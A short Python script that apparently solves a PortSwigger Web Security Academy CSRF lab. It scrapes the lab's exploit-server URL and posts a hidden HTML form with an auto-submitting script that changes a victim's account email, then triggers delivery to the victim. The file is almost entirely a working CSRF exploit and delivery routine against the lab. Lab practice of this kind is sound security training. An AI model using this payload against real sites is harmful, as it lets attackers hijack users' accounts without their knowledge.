import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]

session = requests.Session()
response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)

burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<form action=\"{burp_url}/my-account/change-email\">\r\n    <input type=\"hidden\" name=\"email\" value=\"anyth12@web-security-academy.net\">\r\n</form>\r\n<script>\r\n        document.forms[0].submit();\r\n</script>", "formAction": "DELIVER_TO_VICTIM"}

session.post(exploit_server, data=burp_data)
session.get(exploit_server)
